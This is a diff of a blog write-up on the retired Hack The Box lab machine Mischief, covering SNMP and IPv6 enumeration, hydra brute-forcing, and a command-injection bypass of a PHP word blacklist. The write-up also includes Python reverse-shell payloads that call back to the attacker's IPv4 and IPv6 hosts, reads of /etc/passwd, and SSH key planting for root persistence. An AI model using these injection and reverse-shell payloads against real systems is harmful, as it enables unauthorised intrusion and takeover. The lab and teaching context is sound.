@@ -1,6 +1,8 @@
 ---
 published: false
 ---
+This week we are taking a look at the retired Hack The Box machine [Mischief](https://www.hackthebox.eu/home/machines/profile/145) (Medium difficulty)
+
 Start off with an nmap scan:
 ```
 root@kali: nmap -sC -sV -oN nmap 10.10.10.92 
@@ -152,30 +154,30 @@ optional arguments:
   --https     Use https
 ```
 
-Once the all port scan finishes we can see that port 3366 is open to us, (our snmp-check also confirms that the server is listening on that port)
+Once the all port nmap scan finishes, we can see that port 3366 is open to us, (our `snmp-check` also confirms that the server is listening on that port)
 
 Browsing there we are prompted for HTTP Authentication credentials:
 ![223543464.png]({{site.baseurl}}/Images/Mischief/223543464.png)
 
 
-We use the creds loki:godofmischiefisloki and gain access to the site.
+We use the creds `loki:godofmischiefisloki` and gain access to the site.
 
-Preparing for our gobuster enumeration we try to navigate to a 404 page to see if we can get the server to leak some information (server version, web server etc) and we see that a page is returned:
+Preparing for our `gobuster` enumeration we try to navigate to a 404 page to see if we can get the server to leak some information (server version, web server etc) and we see that a page is returned:
 ![223543301.png]({{site.baseurl}}/Images/Mischief/223543301.png)
 
 
-Initially we believed that this was a custom error page with a HTTP 200 response as a way to block tools like gobuster and dirbuster. So we went straight to wfuzz instead:
-
+Initially we believed that this was a custom error page with a HTTP 200 response as a way to block tools like `gobuster` and `dirbuster`. So we went straight to `wfuzz` instead:
+```
 root@kali: wfuzz --hw 25 -t50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --basic loki:godofmischiefisloki http://10.10.10.92:3366/FUZZ
+```
 
-
-We add the --hw 25 to hide the custom 404 page from the results.
+We add the `--hw 25` to hide the custom 404 page from the results.
 
 snmp mentioned that Apache was running on the machine, but none of our nmap scans picked it up. We just looked at one website, but that was a python one. The only 2 reasons Apache is running and we can see the site are:
 1. Apache is listening on localhost only (127.0.0.1:80)
 1. Apache is listening on a different address or network adapter.
 
-Hack The Box does not provide IPv6 addresses so we need to work it out. Following a guide on how to get an IPv6 address from snmp (http://docwiki.cisco.com/wiki/How_to_get_IPv6_address_via_SNMP) we are able to use smnpwalk to manually work out the IPv6 address of the box:
+Hack The Box does not provide IPv6 addresses so we need to work it out. Following a guide on [how to get an IPv6 address from snmp](http://docwiki.cisco.com/wiki/How_to_get_IPv6_address_via_SNMP) we are able to use `smnpwalk` to manually work out the IPv6 address of the box:
 ```
 root@kali: snmpwalk -v2c -c public 10.10.10.92 1.3.6.1.2.1.4.34.1.3 
 iso.3.6.1.2.1.4.34.1.3.1.4.10.10.10.92 = INTEGER: 2
@@ -197,9 +199,9 @@ FE.80.00.00.00.00.00.00.02.50.56.FF.FE.A4.C8.15
 FE80:0000:0000:0000:0250:56FF:FEA4:C815
 ```
 
-In the end we have 2 IPv6 addresses to try, DEAD:BEEF:0000:0000:0250:56FF:FEA4:C815 and FE80:0000:0000:0000:0250:56FF:FEA4:C815
+In the end we have 2 IPv6 addresses to try, `DEAD:BEEF:0000:0000:0250:56FF:FEA4:C815` and `FE80:0000:0000:0000:0250:56FF:FEA4:C815`
 
-Looking at our own ifconfig we can see that we also have 2 IPv6 addresses and one looks very similar to one of our outputs.
+Looking at our own `ifconfig` we can see that we also have 2 IPv6 addresses and one looks very similar to one of our outputs.
 ```
 ifconfig tun0
 tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
@@ -241,7 +243,6 @@ From fe80::20c:29ff:fe9b:4edd%eth0: icmp_seq=4 Destination unreachable: Address 
 pipe 4
 ```
 
-
 The next step is to re-enumerate the box with this IP address. We can see that we get some different results in our nmap scan:
 ```
 root@kali: nmap -sC -sV -oN nmap-ip6 -6 dead:beef:0000:0000:0250:56ff:fea4:c815
@@ -271,7 +272,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 17.31 seconds
 ```
 
-You might notice that Firefox does not handle IPv6 addresses directly, so we need to update our /etc/hosts file to map it to a friendly name:
+You might notice that Firefox does not handle IPv6 addresses directly, so we need to update our `/etc/hosts` file to map it to a friendly name:
 (After further research we also found that you can wrap the IPv6 address in square brackets  and Firefox will browse there: [beef:0000:0000:0250:56ff:fea4:c815]
 ```
 root@kali: vim /etc/hosts
@@ -281,11 +282,8 @@ root@kali: vim /etc/hosts
 dead:beef:0000:0000:0250:56ff:fea4:c815 mischief.htb
 ```
 
-
 Now if we browse to http://mischief.htb we are presented with a new website:
 ![223870986.png]({{site.baseurl}}/Images/Mischief/223870986.png)
-
-
 
 
 We try the credentials listed on the first website to try and log in to the website. Neither of them work, so the next step is to try and brute force some candidates from a custom wordlist. We generate two lists. One with potential usernames and another with potential passwords:
@@ -330,14 +328,13 @@ trickster
 guest
 ```
 
-
-The lists were generated from splitting all the words in the passwords we have encountered so far, miscief comes from the page title of the first website, this could be a typo, or could be on purpose, this is a trolly box so we assume nothing is a mistake, at the end we have also added some common default credentials.
+The lists were generated from splitting all the words in the passwords we have encountered so far, `miscief` comes from the page title of the first website, this could be a typo, or could be on purpose, this is a trolly box so we assume nothing is a mistake, at the end we have also added some common default credentials.
 
 We use burp to intercept a test login request and can see that a failed login includes some new content on the page "Sorry, those credentials do not match"
 ![223543345.png]({{site.baseurl}}/Images/Mischief/223543345.png)
 
 
-We can use the details of this request combined with the tool hydra to brute force the login form:
+We can use the details of this request combined with the tool `hydra` to brute force the login form:
 ```
 root@kali: hydra -L user.txt -P passwords.txt mischief.htb http-post-form "/login.php:user=^USER^&password=^PASS^:Sorry, those credentials do not match"
 Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
@@ -351,7 +348,7 @@ Hydra (http://www.thc.org/thc-hydra) finished at 2018-12-15 13:13:44
 ```
 
 
-We get a hit! The credentials administrator:trickeryanddeceit are able to log in to the site:
+We get a hit! The credentials `administrator:trickeryanddeceit` are able to log in to the site:
 ![223576097.png]({{site.baseurl}}/Images/Mischief/223576097.png)
 
 
@@ -377,7 +374,7 @@ Then we move on to testing if we can read files with: 
 command=cat /etc/passwd; ping -c 2 127.0.0.1
 ```
 
-and we get the contents of the /etc/passwd file:
+and we get the contents of the `/etc/passwd` file:
 ```
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -413,7 +410,7 @@ Debian-snmp:x:111:113::/var/lib/snmp:/bin/false
 mysql:x:112:115:MySQL Server,,,:/nonexistent:/bin/false
 ```
 
-Looking at the file contents we can see there are only two users; root and loki. We try ls -la /home/loki; ping -c 2 127.0.0.1 but we get a command not allowed error.
+Looking at the file contents we can see there are only two users; root and loki. We try `ls -la /home/loki; ping -c 2 127.0.0.1` but we get a command not allowed error.
 
 Luckily there are many ways to list the contents of a directory, echo is one of them:
 ```
@@ -423,9 +420,9 @@ command=echo /home/loki/*; ping -c 2 127.0.0.1
 
 So we can see that the credentials file we are after is in loki's home directory.
 
-Attempting to cat it directly we get another command not allowed message, which is weird, because we were just able to cat /etc/passwd
+Attempting to cat it directly we get another command not allowed message, which is weird, because we were just able to `cat /etc/passwd`
 
-To see if its a permissions issue on the file we can use the stat command:
+To see if its a permissions issue on the file we can use the `stat` command:
 ```
 stat /home/loki/credentials
 ```
@@ -443,12 +440,12 @@ Change: 2018-05-17 20:29:43.611852308 +0000
  Birth: -
 ```
 
-We can see that stat should work even if we have no permissions on the file. So the error was not due to the fact that we don't have permissions on the credentials file. This leads us to suspect that there is a blacklist on the words allowed through the web application. Luckily for us bash will ignore certain characters when running commands. We are able to split the word with '' for bash to do nothing, but the web application might be dumb enough to treat them as part of the string when performing its string compare against the blacklist:
+We can see that `stat` should work even if we have no permissions on the file. So the error was not due to the fact that we don't have permissions on the credentials file. This leads us to suspect that there is a blacklist on the words allowed through the web application. Luckily for us bash will ignore certain characters when running commands. We are able to split the word with `''` for bash to do nothing, but the web application might be dumb enough to treat them as part of the string when performing its string compare against the blacklist:
 ```
 command=cat /home/loki/cred''ent''ials; ping -c 1 127.0.0.1
 ```
 
-Initially this does not seem to work, this could be because the blacklist contains portions of the words as well like cred etc. but if we expand it to separate every letter we get a result:
+Initially this does not seem to work, this could be because the blacklist contains portions of the words as well like `cred` etc. but if we expand it to separate every letter we get a result:
 ![223707216.png]({{site.baseurl}}/Images/Mischief/223707216.png)
 
 
@@ -461,7 +458,7 @@ loki@Mischief:~$ cat user.txt
 bf58078e7b802c[redacted]
 ```
 
-We read the user.txt and now it's time to move on to root.
+We read the `user.txt` and now it's time to move on to root.
 
 Now that we are on the box lets do some basic enumeration. We can see that we have some bash history:
 ```
@@ -484,9 +481,9 @@ nano .bash_history
 exit
 ```
 
-Looking at the contents of the file, there is something interesting, the SimpleHTTPAuthServer password looks different to the one we found initially in our snmp enumeration. Lets add that to our custom wordlist we created earlier just in case. loki:lokipasswordmischieftrickery
+Looking at the contents of the file, there is something interesting, the `SimpleHTTPAuthServer` password looks different to the one we found initially in our snmp enumeration. Lets add that to our custom wordlist we created earlier just in case. `loki:lokipasswordmischieftrickery`
 
-The next step in the enumeration process is to look at the source code for the web application, sometimes they contain passwords, code comments or other hints. We can see from the database.php file that we have some mysql credentials:
+The next step in the enumeration process is to look at the source code for the web application, sometimes they contain passwords, code comments or other hints. We can see from the `database.php` file that we have some mysql credentials:
 ```
 <?php
 $server = 'localhost';
@@ -496,7 +493,7 @@ $database = 'dbpanel';
 ```
 
 
-The index.php file contains the blacklist of commands they did not want us to run from the website:
+The `index.php` file contains the blacklist of commands they did not want us to run from the website:
 ```
 <?php
 if(isset($_POST['command'])) {
@@ -539,9 +536,9 @@ if(isset($_POST['command'])) {
 ?>
 ```
 
-Most of these seem reasonable, but one standout, that was new to me at least, was the setfacl command.
+Most of these seem reasonable, but one standout, that was new to us at least, was the `setfacl` command.
 
-After doing some research the commands getfacl and setfacl have to do with Access Control List (ACL) settings on Linux. Because the application specifically wanted to block this command we should look for any files with ACLs applied:
+After doing some research the commands `getfacl` and `setfacl` have to do with Access Control List (ACL) settings on Linux. Because the application specifically wanted to block this command we should look for any files with ACLs applied:
 ```
 loki@Mischief: getfacl -R -s -p / | sed -n 's/^# file: //p'
 ...
@@ -577,9 +574,9 @@ mask::r-x
 other::r-x
 ```
 
-Looks like our loki user has been specifically blocked from running sudo and su, but all other users are able to execute it.
+Looks like our loki user has been specifically blocked from running `sudo` and `su`, but all other users are able to execute it.
 
-There are no other users in the /etc/passwd file, but from previous experience we have been able to get reverse shells as accounts such as mysql and www-data and we have a website that can already run commands as www-data
+There are no other users in the `/etc/passwd` file, but from previous experience we have been able to get reverse shells as accounts such as `mysql` and `www-data` and we have a website that can already run commands as `www-data`. How convenient.
 
 With the knowledge we have of the blacklist we need to craft a reverse shell payload. We can use the loki ssh session to test it out and fix the payload till we get a working one. We know that the black list does not block python so we look up our reverse shell cheatsheet and grab the python sample, updating the ip address and port with our own.
 ```
@@ -588,10 +585,9 @@ loki@Mischief:~$ which python
 loki@Mischief:~$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
+Our standard reverse shell payloads and other means of connecting back to our attacking machine hang (`curl`, `wget` etc), this indicates that there is a firewall or iptable rules in place blocking our connections. There are a few things we can also test to see the bounds of the iptables rules, these include trying UDP ports or IPv6 connections.
 
-Our standard reverse shell payloads and other means of connecting back to our attacking machine hang (curl, wget etc), this indicates that there is a firewall or iptable rules in place blocking our connections. There are a few things we can also test to see the bounds of the iptables rules, these include trying UDP ports or IPv6 connections.
-
-The default nc is not able to create an IPv6 listener.  We can verify this by setting up a listener and viewing our netstat
+The default `nc` is not able to create an IPv6 listener.  We can verify this by setting up a listener and viewing our netstat
 ```
 root@kali: nc -nlvp 443
 ...
@@ -600,24 +596,23 @@ netstat -an | grep LISTEN
 tcp       0      0 0.0.0.0:443                  :::*                    LISTEN   
 ```
 
-In order to listen on tcp6 we need to install the openbsd version of netcat with apt-get install netcat-openbsd. Once we have that installed we can use it to listen on IPv6:
+In order to listen on tcp6 we need to install the openbsd version of netcat with `apt-get install netcat-openbsd`. Once we have that installed we can use it to listen on IPv6:
 ```
 root@kali: nc.openbsd -6 -nlvp 443 
 ```
 
-
-In another terminal we can verify it with the same netstat command
+In another terminal we can verify it with the same `netstat` command
 ```
 root@kali: netstat -an | grep LISTEN 
 tcp6       0      0 :::443                  :::*                    LISTEN    
 ```
 
-Now to get our python reverse shell to run on IPv6 we need to change the socket type from AF_INET to AF_INET6. Once we have done that, we update the attacker IP to be the IPv6 and our final command comes out to be:
+Now to get our python reverse shell to run on IPv6 we need to change the socket type from `AF_INET` to `AF_INET6`. Once we have done that, we update the attacker IP to be the IPv6 and our final command comes out to be:
 ```
 command=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::100a",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'; ping -c 1 127.0.0.1
 ```
 
-and we get a reverse shell as www-data:
+and we get a reverse shell as `www-data`:
 ```
 root@kali: nc.openbsd -6 -nlvp 443 
 Listening on [::] (family 10, port 117499167)
@@ -628,7 +623,7 @@ www-data
 $ 
 ```
 
-Now we use our standard python -c 'import pty; pty.spawn("/bin/bash")' to get a bash shell and see if we can run sudo:
+Now we use our standard `python -c 'import pty; pty.spawn("/bin/bash")'` to get a bash shell and see if we can run `sudo`:
 ```
 $ python -c 'import pty; pty.spawn("/bin/bash")'
 www-data@Mischief:/var/www/html$ sudo ls
@@ -637,9 +632,9 @@ sudo: unable to resolve host Mischief: Resource temporarily unavailable
 [sudo] password for root: 
 ```
 
-Finally something useful, we can see that we are able to run sudo, all we need is the root password.
+Finally something useful, we can see that we are able to run `sudo`, all we need is the root password.
 
-Remembering how much of a troll this box has been so far, we go back and try our custom word list and eventually we do get a hit with the password from loki's bash_history:
+Remembering how much of a troll this box has been so far, we go back and try our custom word list and eventually we do get a hit with the password from loki's bash history:
 ```
 www-data@Mischief:/var/www/html$ sudo ls
 sudo ls
@@ -649,7 +644,7 @@ sudo: unable to resolve host Mischief: Resource temporarily unavailable
 www-data is not in the sudoers file.  This incident will be reported.
 ```
 
-When we get that message it means that the log in was successful, but the www-data user is not a sudoer, but the other binary that loki is not allowed to use was su which allows us to change our current user:
+When we get that message it means that the log in was successful, but the `www-data` user is not a sudoer, but the other binary that loki is not allowed to use was `su` which allows us to change our current user:
 ```
 www-data@Mischief:/var/www/html$ su root
 su root
@@ -667,7 +662,7 @@ The flag is not here, get a shell to find it!
 
 And we get another troll.
 
-Looking around the box, there is an empty authorized_keys file:
+Looking around the box, there is an empty `authorized_keys` file:
 ```
 root@Mischief:~/.ssh# ls -la
 ls -la
@@ -677,7 +672,7 @@ drwx------ 6 root root 4096 May 28  2018 ..
 -rw------- 1 root root    0 May 14  2018 authorized_keys
 ```
 
-Back on our attacking machine we can generate some ssh keys without a password and place the generated public key in the remote authorized_keys file:
+Back on our attacking machine we can generate some ssh keys without a password and place the generated public key in the remote `authorized_keys` file:
 ```
 root@kali: ssh-keygen -f thoseguys          
 Generating public/private rsa key pair.
@@ -694,7 +689,7 @@ root@kali: cat thoseguys.pub
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDEdz ... b71Nc2H+jcCCEYRoFzxfl root@kali
 ```
 
-On the target we can echo our public key into the authorized_keys file:
+On the target we can echo our public key into the `authorized_keys` file:
 ```
 root@Mischief:~/.ssh# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDEdz ... b71Nc2H+jcCCEYRoFzxfl root@kali' > authorized_keys
 ```
@@ -712,7 +707,7 @@ root@Mischief:~# cat root.txt
 The flag is not here, get a shell to find it!
 ```
 
-Nope, it must be somewhere else, so we look for any other root.txt files on the machine:
+Nope, it must be somewhere else, so we look for any other `root.txt` files on the machine:
 ```
 root@Mischief:~# find / -name 'root.*' -type f 2>/dev/null
 /usr/lib/python3/dist-packages/twisted/names/__pycache__/root.cpython-36.pyc
